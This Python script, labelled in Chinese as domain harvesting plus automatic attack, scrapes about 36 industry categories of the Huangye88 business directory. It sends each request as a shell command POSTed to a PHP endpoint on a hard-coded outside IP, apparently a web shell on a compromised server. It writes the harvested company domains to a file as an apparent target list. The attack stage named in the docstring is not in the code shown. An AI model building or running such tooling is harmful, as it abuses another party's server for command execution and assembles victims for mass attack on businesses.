#!/usr/bin/env python3
"""黄页88全行业域名采集+自动攻击"""
import subprocess, re, sys, time

# 50+ 行业分类
CATS = [
    "jixie","jianzhu","huagong","fangzhi","dianqi","wujin",
    "yibiao","zhoucheng","gangtie","muju","dianlan","yeya",
    "suliao","baozhuang","shipin","yiliao","huanbao","nengyuan",
    "tongxin","ruanjian","qiche","dianji","zhizao","jiagong",
    "shiyou","yejin","taoci","jiaju","dianzi","guangdian",
    "zhileng","bianyaqi","shukong","jingmi","mucai","xincailiao",
]

PROXY = "http://121.196.233.2/s.php"

def fetch(url):
    """通过中国代理采集"""
    from urllib.parse import quote
    cmd = f"curl -sk --connect-timeout 10 --max-time 15 '{url}' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)'"
    r = subprocess.run(["curl","-sk","--connect-timeout","15","--max-time","20",
        PROXY, "-X","POST", "-d", f"cmd={cmd}"],
        capture_output=True, text=True, timeout=25)
    return r.stdout

def extract(html):
    """提取域名"""
    domains = set()
    for m in re.finditer(r'https?://([a-zA-Z0-9]([a-zA-Z0-9-]*\.)+[a-zA-Z]{2,})', html):
        d = m.group(1).replace("www.","").lower()
        skip = ["huangye88","baidu","google","alicdn","qhimg","anjuke",
                "bjx","beian","cloudflare","moji","w3.org","qihucdn"]
        if not any(x in d for x in skip) and len(d)>8 and "." in d:
            domains.add(d)
    return domains

def main():
    all_domains = set()
    
    for cat in CATS:
        url = f"https://www.huangye88.com/{cat}/"
        print(f"[{cat}] {url} ... ", end="", flush=True)
        html = fetch(url)
        
        if len(html) < 5000:
            print(f"FAIL({len(html)}B)")
            continue
        
        domains = extract(html)
        all_domains.update(domains)
        print(f"{len(domains)} domains")
        time.sleep(1)
    
    # 保存
    with open("/tmp/huangye_domains.txt","w") as f:
        for d in sorted(all_domains): f.write(d+"\n")
    
    print(f"\n总计: {len(all_domains)} → /tmp/huangye_domains.txt")

if __name__ == "__main__":
    main()
